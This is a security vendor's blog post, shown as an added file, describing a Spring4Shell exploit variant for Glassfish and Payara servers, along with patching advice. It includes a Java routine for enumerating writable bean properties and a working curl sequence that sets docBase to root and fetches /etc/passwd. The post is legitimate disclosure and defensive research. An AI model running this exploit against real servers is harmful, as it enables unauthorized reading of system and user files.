@@ -1,0 +1,92 @@
+
+Last week, we announced the discovery of Spring4Shell — a remote code execution (RCE) vulnerability in older versions of the spring-beans package. In our blog post Spring4Shell: The zero-day RCE in the Spring Framework explained, we showed how an old Tomcat exploit for CVE-2010-1622 became relevant again. Due to the nature of the problem, we expected that additional payloads could be created beyond this known Tomcat exploit. And today, our Security Research team has confirmed that this is the case. There are now similar exploits for Glassfish and Payara that leverage the same issue in Spring, but with a different payload. The Payara team were informed of our finding which helped them confirm their own analysis that certain configurations of Payara could be vulnerable.
+But first and foremost, this is NOT a new vulnerability. It is just a new exploit that proves our expectation that the issue is larger than the initial Tomcat issue.  Although Payara will be publishing a hotfix for the affected versions of Payara Community and Payara Enterprise, our remediation advice is still the same. Update your spring-beans package to version 5.3.18 or 5.2.20 or beyond. We just want to emphasize that updating to the newer versions of this package is absolutely needed, and you should prioritize this over anything else.
+Finding more writable properties to exploit
+Snyk’s Security Research team used the function below to find out what the available attributes are in the specific application server that are writable. The function created by Kirill Efimov from our Security R&D team, uses the Spring API to iterate over all available properties to create a list of the properties that can be used for a potential breach.
+1public static HashSet<String> findWritablePds(Object root, String path, int depth, HashSet<Object> visited) {
+2
+3  if (visited == null) {
+4     visited = new HashSet<>();
+5     visited.add(Integer.class);
+6     visited.add(Long.class);
+7     visited.add(Double.class);
+8     visited.add(String.class);
+9  }
+10
+11  HashSet<String> res = new HashSet<>();
+12
+13  if (depth <= 0) return res;
+14  if (visited.contains(root)) return res;
+15  else visited.add(root);
+16
+17  try {
+18     BeanWrapperImpl impl = new BeanWrapperImpl(root);
+19
+20     for (PropertyDescriptor pd : impl.getPropertyDescriptors()) {
+21        if (!impl.isReadableProperty(pd.getName())) continue;
+22        if (pd.getName().equals("accessible")) continue;
+23
+24        if (impl.isWritableProperty(pd.getName())) {
+25           res.add(path + "." + pd.getName());
+26        }
+27
+28        Object value = impl.getPropertyValue(pd.getName());
+29
+30        if (value != null && value != Optional.empty()) {
+31           res.addAll(findWritablePds(value, path + "." + pd.getName(), depth - 1, visited));
+32
+33           if (value.getClass().isArray()) {
+34              try {
+35                 Object[] casted = (Object[]) value;
+36
+37                 for (int i = 0; i < casted.length; i++) {
+38                    res.addAll(findWritablePds(casted[i], path + "." + pd.getName() + "[" + i + "]", depth - 1, visited));
+39                 }
+40              } catch (ClassCastException cce) {
+41                 System.err.println("Exception casting class " + value.getClass().getCanonicalName() + ": " + cce.getMessage());
+42              }
+43           }
+44        }
+45     }
+46  } catch (Exception e) {
+47     e.printStackTrace();
+48  }
+49
+50  return res;
+51}
+By calling this function HashSet<String> result = HandlingFormSubmissionApplication.findWritablePds(greeting, "", 100, null); in your endpoint, you can easily list and inspect them.
+Exploiting the Glassfish / Payara server
+GlassFish is an application server that is similar to Tomcat. We will not go into the details of the differences because that is not really relevant. Payara Server is derived from GlassFish and shares many similarities. However, they are different products, as Payara has more features than the original GlassFish. The folks at Payara wrote a magnificent blog post around these differences, although these are not really relevant for this exploit.
+Let’s use the same application as we did in our previous blog post, but now deploy it on Payara Server (Community) 5.2022.1. Using the function from the previous paragraph showed us that the following attributes are writable:
+1[.class.module.classLoader.resources.dirContext.docBase, .class.module.classLoader.parent.name, .class.module.classLoader.resources.dirContext.debug, .class.module.classLoader.resources.dirContext.allowLinking, .class.module.classLoader.resources.cache.desiredEntryAccessRatio, .content, .class.module.classLoader.resources, .id, .class.module.classLoader.resources.dirContext.cacheTTL, .class.module.classLoader.antiJARLocking, .class.module.classLoader.debug, .class.module.classLoader.resources.dirContext.cacheMaxSize, .class.module.classLoader.resources.dirContext.cached, .class.module.classLoader.resources.dirContext.caseSensitive, .class.module.classLoader.resources.cache.cacheMaxSize, .class.module.classLoader.clearReferencesStatic, .class.module.classLoader.delegate, .class.module.classLoader.resources.cache.maxAllocateIterations, .class.module.classLoader.resources.cache.spareNotFoundEntries, .class.module.classLoader.jarPath]
+One of the properties that is particularly interesting is the class.module.classLoader.resources.dirContext.docBase, which we will use in our new exploit.
+In the exploit below, we use this property to set the docBase to /. Because the root is now set to the actual root of the machine, we are able to access files that are normally not available. The example below shows that we can now download the content of the /etc/passwd file by calling:
+1http://localhost:8080/handling-form-submission-complete/etc/passwd
+Exploit
+1echo "Setting doc base to /"
+2curl -X POST \
+3 -F 'class.module.classLoader.resources.dirContext.docBase=/' \
+4 http://localhost:8080/handling-form-submission-complete/greeting
+5sleep 2
+6echo "Downloading /etc/passwd"
+7curl http://localhost:8080/handling-form-submission-complete/etc/passwd
+Needless to say, this is not something you want, as we can now read arbitrary files on the filesystem. This can disclose valuable intel for malicious people to create follow-up attacks or disclose data related to users.
+The full exploit project created by Calum Hutton, Security Researcher at Snyk, is published on GitHub.
+Update your Spring Framework as soon as you can
+Let’s reiterate that this is NOT a new vulnerability but another example of how to exploit the same Spring4shell vulnerability on a different server. The most important lesson is that this issue in Spring is not specific to Tomcat. The issue in spring itself is quite general, and we might even end up with many exploits in different flavors for different servers. So even if there is no exploit known to your use case yet, does not imply you are not vulnerable!
+The best thing you can, and in my opinion must do, is update your Spring framework (or at least the spring-beans package) to the latest version. As far as we can see, updating your package will solve this vulnerability regardless of the application you are using.
+Snyk can help you be on top of this by routinely scanning your applications. Snyk alerts you and your team when new vulnerabilities are detected, providing recommended next steps to keep your applications secure. What are you waiting for? Start updating!
+Get started in capture the flag
+Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.
+
+
+spring-beans
+spring-beans
+5.3.18
+5.2.20
+HashSet<String> result = HandlingFormSubmissionApplication.findWritablePds(greeting, "", 100, null);
+5.2022.1
+class.module.classLoader.resources.dirContext.docBase
+/
+/etc/passwd
+spring-beans
